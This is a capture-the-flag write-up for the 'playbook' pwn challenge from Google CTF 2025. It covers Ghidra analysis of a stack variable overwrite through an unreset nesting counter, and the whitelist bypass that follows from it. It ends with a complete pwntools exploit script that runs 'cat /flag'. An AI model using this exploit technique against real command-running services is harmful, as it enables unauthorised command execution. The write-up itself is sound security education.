---
title: "playbook - Google Capture The Flag 2025"
category: "pwn"
subcategory: "static-analysis"
type: "writeup"
tags: ["pwn", "ghidra", "checksec", "strcpy", "playbook", "static-analysis", "google-capture-the-flag", "google-capture-the-flag-2025", "2025", "ctf-writeup"]
summary: "AUTHOR: [[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)"
source:
  name: "CTFtime writeup #40321"
  url: "https://ctftime.org/writeup/40321"
original_source: "https://ctf.1fra.fr/pad/s/c0kQjqy7NX"
ctf:
  name: "Google Capture The Flag 2025"
  year: 2025
  challenge: "playbook"
---

## Metadata

- **CTF:** Google Capture The Flag 2025
- **Task:** playbook
- **Author team:** HDFR
- **CTFtime:** <https://ctftime.org/writeup/40321>
- **Original writeup:** <https://ctf.1fra.fr/pad/s/c0kQjqy7NX>

---
# Playbook - pwn

AUTHOR: [[email protected]](https://ctftime.org/cdn-cgi/l/email-protection)

This pwn challenge is about an application where you can create playbooks, and execute them.

For example, the user can define the following playbook:  
```  
STEP  
note: Check time  
STEP  
cmd: date  
ENDSTEP  
STEP  
note: Double check  
ENDSTEP  
STEP  
cmd: sleep 1  
ENDSTEP  
STEP  
cmd: date  
ENDSTEP  
ENDSTEP  
STEP  
note: List files  
STEP  
cmd: ls  
ENDSTEP  
ENDSTEP  
```

This playbook would produce the following output when executed :  
```  
Note: Daily routine

Note: Check time

Command: date

Sun 29 Jun 2025 10:23:59 PM CEST

Note: Double check

Command: sleep 1

Command: date  
  
Sun 29 Jun 2025 10:24:01 PM CEST

Note: List files

Command: ls

chal [exploit.py](http://exploit.py) peda-session-chal.txt [playbooks.md](http://playbooks.md)  
```

We see here that:  
\- Playbooks can contain sub-playbooks.  
\- There are three tyes of playbooks.  
\- Playbooks that are notes. It just prints the note name.  
\- Playbooks that are commands. It executes the command given.  
\- Playbooks that are nothing.  
  
The nothing playbook just means that nothing will be printed or executed, but it can contains subplaybooks.

But the plot twist is the following: if we try to execute a command that is different that **sleep 1**, **date**, or **ls**, we get the following error:  
```  
cmd: echo "I am a thug"  
Blocking potentially dangerous command. Contact our sales department if you need whitelist updates.  
```  
## Ghidra analysis

We open the project in ghidra, and rename every variable to have some more understanding about the behaviour of the parsing of the user input and the execution of the playbooks.

### main  
Entry point of the function: main function  
```c  
void main(void)

{  
setvbuf((FILE *)stdin,(char *)0x0,2,0);  
setvbuf((FILE *)stdout,(char *)0x0,2,0);  
intro();  
do {  
menu();  
} while( true );  
}  
```

### menu  
```c  
void menu(void)

{  
undefined4 uVar1;  
  
puts("=== MENU ===");  
puts("1. Manual");  
puts("2. New playbook");  
puts("3. Delete playbook");  
puts("4. Run playbook");  
puts("5. Quit");  
uVar1 = get_int();  
switch(uVar1) {  
case 1:  
manual();  
break;  
case 2:  
new_playbook();  
break;  
case 3:  
delete_playbook();  
break;  
case 4:  
run_playbook();  
break;  
case 5:  
/* WARNING: Subroutine does not return */  
exit(0);  
}  
return;  
}  
```

### new_playbook  
```c

void new_playbook(void)

{  
int strcmp_return;  
uint playbook_id;  
uint *playbook_ptr_tmp;  
char *fgets_return;  
char user_input [2048];  
char user_command [2048];  
int max_user_input;  
uint playbook_id_arr [11];  
uint *playbook_ptr;  
int isPrevLineStep;  
  
playbook_ptr = playbook_id_arr;  
isPrevLineStep = 1;  
max_user_input = 0xfb;  
puts("Enter new playbook in the SOPS language. Empty line fin ishes the entry.");  
playbook_id_arr[0] = allocate_playbook();  
do {  
while( true ) {  
fgets_return = fgets(user_input,max_user_input,(FILE *)stdi n);  
if ((fgets_return == (char *)0x0) || (user_input[0] == '\n')) {  
printf("Saved playbook (id %d).\n\n",(ulong)playbook_id_arr [0]);  
return;  
}  
memset(user_command,0,0x800);  
__isoc99_sscanf(user_input,"%s",user_command);  
strcmp_return = strcmp(user_command,"STEP");  
if (strcmp_return != 0) break;  
playbook_ptr_tmp = playbook_ptr + 1;  
nesting_depth = nesting_depth + 1;  
playbook_ptr = playbook_ptr_tmp;  
if (9 < nesting_depth) {  
puts("Max nesting depth reached.");  
/* WARNING: Subroutine does not return */  
exit(1);  
}  
playbook_id = allocate_playbook();  
*playbook_ptr_tmp = playbook_id;  
add_child(playbook_ptr[-1],*playbook_ptr);  
isPrevLineStep = 1;  
}  
strcmp_return = strcmp(user_command,"ENDSTEP");  
if (strcmp_return == 0) {  
playbook_ptr = playbook_ptr + -1;  
nesting_depth = nesting_depth + -1;  
if (nesting_depth < 0) {  
puts("Mismatched STEP and ENDSTEP.");  
/* WARNING: Subroutine does not return */  
exit(1);  
}  
}  
else {  
strcmp_return = strcmp(user_command,"cmd:");  
if (strcmp_return == 0) {  
if (isPrevLineStep == 0) {  
puts("Note and command statements are allowed only im mediately after STEP statements.");  
/* WARNING: Subroutine does not return */  
exit(1);  
}  
__isoc99_sscanf(user_input,"%s %[^\n]",user_command,us er_command);  
validate_command(user_command);  
strcpy(steps + (long)(int)*playbook_ptr * 0x22c + 0x2c,us er_command);  
*(uint *)(steps + (long)(int)*playbook_ptr * 0x22c) =  
*(uint *)(steps + (long)(int)*playbook_ptr * 0x22c) | 2;  
}  
else {  
strcmp_return = strcmp(user_command,"note:");  
if (strcmp_return != 0) {  
puts("Invalid statement.");  
/* WARNING: Subroutine does not return */  
exit(1);  
}  
if (isPrevLineStep == 0) {  
puts("Note and command statements are allowed only im mediately after STEP statements.");  
/* WARNING: Subroutine does not return */  
exit(1);  
}  
__isoc99_sscanf(user_input,"%s %[^\n]",user_command,us er_command);  
strcpy(steps + (long)(int)*playbook_ptr * 0x22c + 0x2c,us er_command);  
*(uint *)(steps + (long)(int)*playbook_ptr * 0x22c) =  
*(uint *)(steps + (long)(int)*playbook_ptr * 0x22c) | 4;  
}  
}  
isPrevLineStep = 0;  
} while( true );  
}  
```

### allocate_playbook  
```c  
int allocate_playbook(void)

{  
int nth_playbook;  
  
nth_playbook = 1;  
while( true ) {  
if (1023 < nth_playbook) {  
puts("Out of memory.");  
/* WARNING: Subroutine does not return */  
exit(1);  
}  
if ((*(uint *)(steps + (long)nth_playbook * 0x22c) & 1) == 0) break;  
nth_playbook = nth_playbook + 1;  
}  
memset(steps + (long)nth_playbook * 0x22c,0,0x22c);  
*(undefined4 *)(steps + (long)nth_playbook * 0x22c) = 1;  
return nth_playbook;  
}  
```

### run_playbook  
```c  
void run_playbook(void)

{  
uint playbook_id;  
  
puts("Enter playbook id:");  
playbook_id = get_int();  
printf("Executing playbook %d. Press enter to complete the st ep.\n",(ulong)playbook_id);  
execute(playbook_id,0);  
return;  
}  
```

### execute  
```c  
void execute(int playbook_id,int param_2)

{  
int local_c;  
  
if ((0 < playbook_id) && (playbook_id < 0x400)) {  
if ((*(uint *)(steps + (long)playbook_id * 0x22c) & 1) == 0) {  
puts("This playbook does not exist.");  
}  
else {  
if ((*(uint *)(steps + (long)playbook_id * 0x22c) & 2) == 0) {  
if ((*(uint *)(steps + (long)playbook_id * 0x22c) & 4) != 0) {  
print_depth(param_2);  
printf("Note: %s\n",(long)playbook_id * 0x22c + 0x4c7b6c );  
skip();  
}  
}  
else {  
print_depth(param_2);  
printf("Command: %s\n",(long)playbook_id * 0x22c + 0x4c7 b6c);  
skip();  
system(steps + (long)playbook_id * 0x22c + 0x2c);  
skip();  
}  
for (local_c = 0; local_c < 10; local_c = local_c + 1) {  
if (*(int *)(steps + ((long)local_c + (long)playbook_id * 0x8 b) * 4 + 4) != 0) {  
execute(*(undefined4 *)(steps + ((long)local_c + (long)pl aybook_id * 0x8b) * 4 + 4),  
param_2 + 1);  
}  
}  
}  
return;  
}  
puts("Invalid id.");  
/* WARNING: Subroutine does not return */  
exit(1);  
}  
```

## Analysis of the ghidra renamed code

### Playbook chunk structure  
After analyzing the functions **new_playbook**, and **alocate_playbook**, , we understand that a playbook chunk looks like this :

![](<https://i.imgur.com/ayXdEev.png>)

The **playbook info** are the first 4 bytes of the playbook chunk.  
It helps us to understand:  
\- if a playbook chunk is free or allocated  
\- if is describes a command, a note, or nothing.

Regarding the playbook info integer:  
Looking the least significants bits :  
If we look at the lease signi  
\- If the bit 1 is set, then the playbook is allocated, free otherwise  
\- If the bit 2 is set, then the playbook is a command  
\- If the bit 3 is set, then the playbook is a note

For example, the following playbook:  
```  
cmd: ls  
STEP  
note: child 1  
ENDSTEP  
STEP  
note: child 2  
STEP  
note: child 2.a  
ENDSTEP  
ENDSTEP  
```

Gives us the following :  
![](<https://i.imgur.com/KMrSJGg.png>)

## Exploit

We see in the execute function that a commands and notes shares the same content. 

My first intuition was to create a note with some content and that we manage to enable the **command** bit, so that a command will be executed. However, I did not find a away to achieve this.

**The technique that I actually used was to create a note that overlaps on the next chunk, to craft another playbook that is allocated and that is a command.**

The thing is that the function that takes our user_input is the following : 

```  
fgets_return = fgets(user_input,max_user_input,(FILE *)stdin);  
```

This means that the program reads at most *max_user_input* bytes, which is equals 215 bytes (0xfb).

If we want to overflow to the next note, we need to give a playbook content that is more than 0x200 bytes (size of the content of the playbook).

This means that we need to overwrite the content of max_user_input.

Lucky us again, this is possible !

### Overriding the value of max_user_input

If we analyse the code of new_playbook, we see that we have a pointer that points to 4 bytes, **playbook_ptr**, that is initialized to a memory location near **max_user_input**. We also see that it can be decremented when a **ENDSTEP** input is given.

A check is done to see that the number of **STEP** and **ENDSTEP** matches, but the variable that hold the count (**nested_depth**) is global and not set to zero when a new_playbook is registered.

This means that we can create a new_playbook, do some number of **STEPS** and nothing more (*yes, the code doesn't check if the STEPS are closed with ENDSTEPS*), and so the global variable nested_depth would be equal to positive.   
This allows us, in another call to new_playbook, to do some **ENDSTEPS** and **nested_depth** would be decremented and not be negative (as it was incremented in the previous step), allowing us to decrement the playbook_ptr and make it point to the value of max_user_input.

We also observe that when STEP is called, then playbook_ptr is incremented, then the value pointed is set to the result of allocate_playbook, which gives us, if nothing has been freed, the number of playbooks created so far plus one.

We also see that at the start of **new_playbook**, **max_user_input** is 4 bytes below the address of **playbook_ptr**, which is **playbook_ptr - 1**.

This means that, we can register a playbook with TWO **ENDSTEPS** and one **STEP**.  
At the beginning of the function new_playbook, the **playbook_ptr** is set to the **playbook_ptr_arr** memory address.  
The TWO **ENDSTEPS** decrement it twice.  
Then, the **STEP** increments it, and set the value of **max_user_input** by the result given by the **allocate_playbook** function. We need to create a lot of playbook before so that **allocate_playbook** returns a big number.

### Summary

#### First step:

We register 1000 playbook with a single note inside.

#### Second step:

We register a playbook that contains **2** STEPS. This sets the global variable **nested_depth** to 2

#### Third step

We register a playbook that contains:  
**2** ENDSTEP. This is valid because of the previous step and decrement the playbook_ptr by 2  
**1** STEP. This increment playbook_ptr by one, and sets the value it points to (which is **max_user_input**) to allocated_playbook return value, which is 1005  
STEP  
note: *custom_payload*  
ENDSTEP  
with custom_payload being the padding + the crafted playbook.

#### Fourth step

Execute the crafted_playbook id, which is at the id just next the one that crafted id. With gdb, we observe that it is at id 1007.

## Python code to run the exploit

```python  
#!/usr/bin/env python3  
from pwn import *  
import tempfile  
import os

binary = "./chal"  
remote_addr = "[playbook.2025.ctfcompetition.com](http://playbook.2025.ctfcompetition.com)"  
remote_port = 1337

elf = context.binary = ELF(binary, checksec=False)

# Set debug level  
context.log_level = "debug"

# Set your gdb commands here (breapoints, displays, etc.)  
gs = f"""  
"""

def run():  
if args.REMOTE:  
server = remote(remote_addr, remote_port)  
server.recvuntil(b'You can run the solver with:\n')  
execute = server.recvline().strip().decode()  
print(f"Executing: {execute}")  
  
  
# Download the PoW script  
pow_script = subprocess.run(['curl', '-sSL', 'https://goo.gle/kctf-pow'],   
capture_output=True, text=True).stdout  
  
# Create a temporary file to hold the PoW script  
with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:  
f.write(pow_script)  
temp_file = [f.name](http://f.name)  
  
try:  
# Execute the PoW script with the command provided by the server  
solve_cmd = execute.split()[-1]  
result = subprocess.run(['python3', temp_file, 'solve', solve_cmd],   
capture_output=True, text=True)  
solution = result.stdout.strip()  
print(f"Solution: {solution}")  
  
# Send the solution back to the server  
server.sendline(solution.encode())  
  
finally:  
os.unlink(temp_file)  
  
return server  
elif args.GDB:  
context.terminal = ["tmux", "splitw", "-h", "-l", "120"]  
try:  
return gdb.debug(binary, gdbscript=gs)  
except ValueError:  
print("ERROR: tmux not active")  
exit(1)  
else:  
return process(binary, stderr=STDOUT)

def create_empty_playbook():  
"""  
Create an empty playbook with a single note step.  
"""  
p.sendline(b"2") # Select the 2nd option to create a playbook  
p.recvline()  
empty_playbook = b"""note: empty step

"""  
p.sendline(empty_playbook)  
p.recvuntil(b"5. Quit\n")

p = run()

# Read the initial menu  
p.recvuntil(b"5. Quit\n")

# ===================================================================  
# Step one:  
# Create a 1000 playbooks

for i in range(1000):  
create_empty_playbook()

# ===================================================================  
# Step two:  
# Create a playbook with TWO STEPS => nesting_depth = 2

p.sendline(b"2") # Select the 2nd option to create a playbook  
p.recvline()

playbook = b"""STEP  
STEP

"""

p.sendline(playbook)  
p.recvuntil(b"5. Quit\n")

# ===================================================================  
# Step three:  
# 1. Create a playbook with two ENDSTEP and ONE STEP => overwrite max_input variable  
# 2. Create a note which content overlaps the next playbook chunk. Set the content so that  
# its playbook info has the flag is_taken set to 1 and the flag is_command set to 1.

p.sendline(b"2") # Select the 2nd option to create a playbook  
p.recvline()

command = b"cat /flag"

playbook = b"""ENDSTEP  
ENDSTEP  
STEP  
STEP  
note: """ + b"A" * 0x200 + b"\x03AAA" + b"A" * 0x28 + command + b"""   
ENDSTEP

"""

p.sendline(playbook)  
p.recvuntil(b"5. Quit\n")

# ===================================================================  
# Step four:  
# Execute the playbook with id of 1007, which is the crafted playbook

# Run the playbook with the id 1006  
p.sendline(b"4") # Run playbok  
p.recvline()  
p.sendline(b"1007") # Select id 1  
p.recvline()  
p.recvline()

# Read playbook output  
p.sendline(b"")  
p.recvline()  
p.sendline(b"")  
p.recvline()  
p.sendline(b"")  
p.recvline()

# Receive all input until the end  
p.recvall()  
```

## Things that can be improved

It is pretty slow to create one thousand playbooks on the server. I could have computed the exact number of bytes I needed to craft a command.  
Also, I could have created subplaybooks in the playbooks i registered instead of sending a playbook containing exactly one.

We have to re-run the script everytime we can to send a new command. There might be two solutions:   
\- the command we send open a reverse shell (might not work on the ctf environment)  
\- we write a script that repeats steps 2 and 3 and computed the id of the playbook to execute.

I had to run the script three times, with the command  
\- ls -lah  
\- ls -lah /  
\- cat /flag
